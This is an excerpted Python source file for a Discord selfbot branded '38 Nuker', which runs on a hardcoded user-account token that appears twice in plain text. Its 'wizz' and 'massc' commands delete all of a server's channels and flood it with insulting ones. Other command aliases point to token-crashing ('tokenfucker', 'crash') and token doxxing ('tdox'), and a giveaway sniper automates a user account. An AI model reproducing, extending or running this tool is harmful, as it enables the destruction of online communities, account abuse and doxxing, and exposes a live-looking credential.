...
token = ("NzYzNzI4NzcyMzgxNTQwMzgy.X8JcKA.lnF8EWRkEGiMtzsi2StKE0bNu4w")
password = ('3')
prefix = ('A')


vv = commands.Bot(command_prefix=prefix, self_bot=True)
vv.remove_command('help')
...
async def on_message(message):
    ...
    if f'Congratulations <@{vv.user.id}>' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:    
                print(""
    ...
    await vv.process_commands(message)
...
██████████████████████████████████████████████████████████████████████████████████████████                                                 
    ...
    print(f'{Fore.YELLOW}                      Logged in as: {vv.user.name}#{vv.user.discriminator}')
...
@vv.command()   
async def help(ctx):
    embed = discord.Embed(title=" 38 Nuker ", color= discord.Color(random.randint(0xffffff, 0xffffff)))
...
async def info(ctx):
    ...
    embed.set_thumbnail(url="")
    embed.add_field(name="**38**", value="Developer/Coder.\n", inline=False)
    embed.set_footer(text=f"Request by {ctx.author}", icon_url=ctx.author.avatar_url)
    embed.set_image(url="https://images-ext-1.discordapp.net/external/5HowBHCGOdiOxGepyooIrbt0n9E07pErW4Qgk3rQA7E/https/images-ext-2.discordapp.net/external/nLNvmlnChwiuJIGJB-BHvg7T6iNfw9RasPv61Yxd9s8/%253Fsize%253D256%2526f%253D.gif/https/cdn.discordapp.com/avatars/577455997216489473/a_410c25ea350611bed2db3ced087050d4.gif?format=png")
    await ctx.send(embed=embed)
...
async def wizz(ctx):
    ...
    for users in ctx.guild.members:
        try:
            ...
            print(f"{Fore.YELLOW}38 OWNS YOU ")
    for channel in ctx.guild.channels:
            await channel.delete()
            print(f"{Fore.YELLOW}Deleted {channel.name}")
    for i in range(1, 40):
            await ctx.guild.create_text_channel(name=f'38 hoed you {i}')
            await ctx.guild.create_voice_channel(name=f'38 hoed you {i}')
            await ctx.guild.create_category(name=f'38 hoed you {i}')
...
async def massc(ctx):
  ...
  for i in range(100):
    await ctx.guild.create_text_channel(name=f'vv hoed you ')
...
async def stream(ctx, *, message): 
    ...
    stream = discord.Streaming(
        name=message,
        url="https://www.twitch.tv/38", 
    )
    await vv.change_presence(activity=stream)
...
async def game(ctx, *, message): # b'\xfc'
    ...
    await vv.change_presence(activity=game)

@vv.command()
async def watch(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    await vv.change_presence(
...
async def slap(ctx, user: discord.Member):
    ...
    try:
        ...
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"38_slap.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
...
@vv.command(name='groupleaver', aliase=['leaveallgroups', 'leavegroup', 'leavegroups'])
async def group(ctx): 
    await ctx.message.delete()
    for channel in vv.private_channels:
...
async def purge(ctx, amount: int): 
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == vv.user).map(lambda m: m):
        try:
...
@vv.command(aliases=['tokenfucker', 'disable', 'crash']) 
...
@vv.command(aliases=['tokinfo', 'tdox'])
...
vv.run("NzYzNzI4NzcyMzgxNTQwMzgy.X8JcKA.lnF8EWRkEGiMtzsi2StKE0bNu4w", bot=False)
